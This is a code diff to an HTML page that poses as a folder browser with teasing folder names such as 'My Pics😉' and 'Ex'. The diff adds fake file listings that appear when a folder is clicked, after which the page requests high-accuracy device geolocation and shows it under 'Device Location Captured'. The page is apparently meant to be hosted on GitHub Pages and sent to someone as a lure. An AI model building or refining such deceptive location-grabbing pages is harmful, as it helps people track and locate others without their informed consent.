@@ -35,6 +35,10 @@ body {margin:0; font-family:Arial,sans-serif; background:#f8fafd; color:#202124;
 .folder-name {margin-top:10px; font-size:15px; font-weight:500; word-break:break-word;}
 #locBox {margin-top:20px; padding:16px; background:#eef5ff; border-radius:12px; display:none; border:1px solid #d3e3fd; font-size:15px; line-height:1.6;}
 #locBox span {word-break:break-all;}
+#fileList {margin-top:15px; padding:15px; background:#f9fbff; border-radius:10px; display:none; border:1px solid #e0e7ff;}
+#fileList ul {list-style:none; padding:0; margin:0;}
+#fileList li {padding:10px 0; border-bottom:1px solid #eef1ff;}
+#fileList li:last-child {border-bottom:none;}
 
 @media (max-width:700px) {
     .topbar {padding:0 10px; gap:8px;}
@@ -121,7 +125,12 @@ body {margin:0; font-family:Arial,sans-serif; background:#f8fafd; color:#202124;
         </div>
     </div>
 
-    <div id="locBox" style="margin-top:25px; padding:18px; background:#eef5ff; border-radius:10px; display:none; border:1px solid #d3e3fd;">
+    <div id="fileList">
+        <strong>📂 Folder Contents</strong>
+        <ul id="fileListItems"></ul>
+    </div>
+
+    <div id="locBox">
         <strong>📍 Device Location Captured</strong><br><br>
         Folder selected: <span id="whichFolder" style="font-weight:bold;"></span><br>
         Latitude: <span id="gotLat" style="font-family:monospace; color:#1a73e8;"></span><br>
@@ -134,7 +143,16 @@ body {margin:0; font-family:Arial,sans-serif; background:#f8fafd; color:#202124;
 </div>
 
 <script>
+const folderContents = {
+    'My Pics😉': ['sunset.jpg', 'beach.png', 'family.jpeg', 'mountains.png'],
+    'School work': ['essay.docx', 'project slides.pdf', 'notes.txt', 'research-data.csv'],
+    'Holiday⛱️': ['itinerary.pdf', 'tickets.eml', 'photos.zip', 'hotel-booking.pdf'],
+    'Friends': ['group-photo.jpg', 'birthday-party.mp4', 'reunion-2026.png'],
+    'Ex': []
+};
+
 function handleFolderClick(folderName) {
+    // Stop — no navigation ever happens
     if (location.protocol !== 'https:') {
         alert('⚠️ Location only works on GitHub Pages (https://)\n\nUpload to GitHub and use that link.');
         return;
@@ -145,6 +163,24 @@ function handleFolderClick(folderName) {
         return;
     }
 
+    // Show folder contents first
+    const files = folderContents[folderName] || [];
+    const list = document.getElementById('fileListItems');
+    list.innerHTML = '';
+    if (files.length) {
+        files.forEach(f => {
+            const li = document.createElement('li');
+            li.textContent = '📄 ' + f;
+            list.appendChild(li);
+        });
+    } else {
+        const li = document.createElement('li');
+        li.textContent = 'This folder is empty.';
+        list.appendChild(li);
+    }
+    document.getElementById('fileList').style.display = 'block';
+
+    // THEN grab location — stays on same page
     navigator.geolocation.getCurrentPosition(
         function(position) {
             const lat = position.coords.latitude;
@@ -176,11 +212,7 @@ function handleFolderClick(folderName) {
             }
             alert(message);
         },
-        {
-            enableHighAccuracy: true,
-            timeout: 15000,
-            maximumAge: 0
-        }
+        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
     );
 }
 
